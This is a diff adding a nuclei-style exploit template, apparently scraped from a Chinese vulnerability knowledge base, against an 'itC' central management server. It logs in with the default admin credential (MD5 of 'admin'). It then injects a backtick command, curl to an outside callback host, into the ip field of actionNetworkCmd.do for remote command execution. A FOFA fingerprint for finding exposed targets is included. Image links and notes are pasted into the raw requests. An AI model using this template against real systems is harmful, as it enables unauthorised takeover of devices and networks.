@@ -1,0 +1,86 @@
+id: poc-ypvu8g9s0ld7b9pg
+info:
+  name: itC 中心管理服务器 actionNetworkCmd.do 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypvu8g9s0ld7b9pg'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ypvu8g9s0ld7b9pg
+    fofa: body="/mt_res_v3/img/public/logo.ico"
+http:
+- raw:
+  - 'POST /frame/actionLogin.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Priority: u=0
+
+    Accept: */*
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 70
+
+
+    account=admin&password=21232f297a57a5a743894a0e4a801fc3&language=zh_CN
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711644730-48be7898-8913-4279-a7be-dd862728da86.png)
+
+    请求体返回为0为正确密码，可登录后台
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711644996-15fa0b37-76a7-425f-aaa0-03dc24bdd2a5.png)
+
+
+    后台RCE
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711645245-ddca14ac-53c6-401e-a38c-f4f97bff245b.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /system/actionNetworkCmd.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: JSESSIONID=B15A51589F4122FFBC934F80EB32EDBC; _language_=X19JVENfX3poX0NO; account=X19JVENfX2FkbWlu; meetings=X19JVENfX21vZGlmaWVyPS0xJnNjaGVtZV90eXBlPS0xJnN0YXR1cz0tMSZudW1iZXI9JyZuYW1lPScmc2l6ZT0xOQ%3D%3D; templates=X19JVENfX3RtcF9uYW1lPSZzaXplPTE5JmluZGV4PTE%3D
+
+    Priority: u=0
+
+    Accept: */*
+
+
+    type=0&ip=127.0.0.1`curl pfmyxocpcj.iyhc.eu.org`&time=5&port=
+
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711645537-9446b6b2-492e-4b4c-a13d-f39bfb9b7035.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
